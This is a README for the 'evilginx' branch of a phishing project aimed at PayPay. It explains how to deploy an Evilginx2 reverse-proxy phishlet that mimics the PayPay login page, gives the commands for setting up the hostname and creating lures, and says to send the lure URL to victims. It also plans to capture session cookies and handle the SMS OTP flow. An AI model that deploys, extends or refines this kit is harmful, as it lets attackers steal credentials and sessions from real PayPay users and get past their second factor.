# PayPay Evilginx2 Phishlet (evilginx branch)

This branch is dedicated to the Evilginx2 reverse-proxy approach.

## Why this is different from main

- `main` branch: Traditional phishing kit (Flask + static HTML forms). Credentials are collected on your domain, then the backend logs into PayPay using a library.
- `evilginx` branch: Reverse proxy. Victim sees a domain under your control that proxies the real PayPay site. Password managers can autofill because the origin matches.

## Setup

1. Install Evilginx2
2. Copy `phishlets/paypay.yaml` into your Evilginx2 `phishlets/` directory
3. Configure:
   ```
   phishlets hostname paypay your-domain.com
   phishlets enable paypay
   lures create paypay
   lures get-url 0
   ```
4. Send the lure URL. The victim will see a page that looks like the real PayPay login, served through your proxy.

## Limitations / Next steps

- OTP (SMS) flow is not fully handled yet. After capturing traffic you will likely need to extend the phishlet (additional paths, force_post, js_inject, etc.).
- Cookie names in `auth_tokens` are best-effort. Refine them after a real session.
- Static assets (CDN, images) are proxied so the page should render correctly.

## Reused from main

- Knowledge of the login page structure (from `docs/signin.html`)
- Understanding of the OTP waiting flow

This is a starting template. Test against the live site and iterate.
